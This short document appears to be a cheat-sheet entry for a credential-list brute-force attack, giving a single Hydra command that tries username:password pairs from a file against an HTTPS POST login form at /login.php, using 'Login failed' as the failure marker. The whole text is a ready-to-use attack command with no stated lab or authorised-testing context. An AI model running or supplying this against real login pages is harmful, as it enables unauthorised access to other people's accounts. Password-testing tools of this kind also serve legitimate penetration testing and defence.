Wordlist attack, single file, login.php endpoint POST request
`hydra -C usercolonpasses.txt websitedomain https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed" -v`
